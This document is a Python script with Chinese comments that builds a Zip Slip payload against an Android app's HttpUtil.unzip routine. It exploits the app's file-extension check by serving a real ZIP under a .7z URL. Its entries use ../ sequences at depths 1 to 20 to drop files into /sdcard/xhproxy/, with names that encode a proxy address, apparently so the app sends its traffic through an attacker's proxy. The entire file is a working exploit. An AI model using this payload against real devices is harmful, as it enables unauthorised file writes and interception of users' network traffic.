# -*- coding: utf-8 -*-
"""build_slip_zip.py - 造 ZIP-SLIP 载荷(真 ZIP, 给 HttpUtil.unzip 用)
关键: needDecode() 只看 URL 结尾是否 7z; 而下载器实际解压用 java.util.zip(ZipInputStream)
      => 必须提供**真 ZIP**, 但下发的 URL 仍以 .7z 结尾
条目: ../ 深度 1..20 + /mnt/sdcard/xhproxy/<密文> + /sdcard/xhproxy/<密文>
"""
import io
import os
import zipfile

BASE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(BASE, "payload_proxy_zip.bin")

DIGITS = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
KEYS = ["Q", "W", "E", "R", "A", "S", "D", "F", "Z", "X"]


def enc(p):
    o = []
    for ch in p:
        if ch == '.':
            o.append('O')
        elif ch == ':':
            o.append('P')
        elif ch.isdigit():
            o.append(KEYS[DIGITS.index(ch)])
        else:
            o.append(ch)
    return "".join(o)


PROXY = "192.168.137.1:18080"
ENC = enc(PROXY)
MARK = b"P200-XHPROXY\n"
print("[0] 代理 %s -> 文件名 %s" % (PROXY, ENC))

names = []
for n in range(1, 21):
    names.append(("../" * n) + "mnt/sdcard/xhproxy/" + ENC)
    names.append(("../" * n) + "sdcard/xhproxy/" + ENC)
names.append(("../" * 4) + "mnt/sdcard/xhproxy_on.txt")
names.append(("../" * 6) + "sdcard/xhproxy_on.txt")
# 去重
seen = set()
uniq = []
for x in names:
    if x not in seen:
        seen.add(x)
        uniq.append(x)

with zipfile.ZipFile(OUT, "w", zipfile.ZIP_STORED) as z:
    for nm in uniq:
        z.writestr(nm, MARK)

print("[1] 条目 %d, 大小 %dB" % (len(uniq), os.path.getsize(OUT)))
with zipfile.ZipFile(OUT) as z:
    bad = 0
    for i in z.infolist()[:6]:
        print("    " + i.filename)
    for i in z.infolist():
        if ".." not in i.filename:
            bad += 1
    print("[2] 含 ../ 的条目: %d / %d" % (len(uniq) - bad, len(uniq)))
